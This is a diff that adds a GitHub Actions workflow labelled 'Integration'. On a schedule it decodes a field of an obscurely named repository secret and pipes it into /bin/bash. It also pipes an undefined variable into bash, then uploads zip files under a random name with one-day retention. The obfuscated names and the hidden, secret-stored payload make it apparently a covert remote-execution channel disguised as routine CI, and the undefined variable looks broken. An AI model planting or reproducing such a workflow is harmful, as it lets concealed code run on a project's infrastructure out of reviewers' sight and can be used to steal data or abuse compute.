@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          jivyf2: ${{ secrets.jivyf2 }}
+        run: |
+          printf '%s' "$jivyf2" | jq -r .g51274 | /bin/bash
+          echo $d22935 | jq -r .sxjf09532 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: KzKMnBvl
+          path: "*.zip"
+          retention-days: 1
